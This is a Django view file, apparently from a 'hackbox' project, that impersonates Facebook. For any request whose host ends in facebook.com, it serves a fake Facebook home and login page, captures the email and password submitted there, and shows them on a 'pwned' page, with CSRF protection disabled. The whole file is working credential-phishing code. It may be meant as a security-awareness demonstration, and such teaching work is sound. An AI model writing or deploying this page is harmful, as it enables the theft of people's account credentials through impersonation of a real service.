from django.template import loader
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def index(request):

	if request.META['HTTP_HOST'].lower().endswith('facebook.com'):

		context = {}
		if request.path.startswith('/login'):

			template = loader.get_template('hackbox/facebook-login.html')
			if request.method == 'POST':
				email = 'email' in request.POST and request.POST['email'] or False
				passwd = 'pass' in request.POST and request.POST['pass'] or False

				if email and passwd:
					template = loader.get_template('hackbox/pwned.html')
					context['login'] = email
					context['password'] = passwd
		else:
			template = loader.get_template('hackbox/facebook-index.html')

		return HttpResponse(template.render(context, request))


	context = {}
	template = loader.get_template('hackbox/index.html')

	return HttpResponse(template.render(context, request))
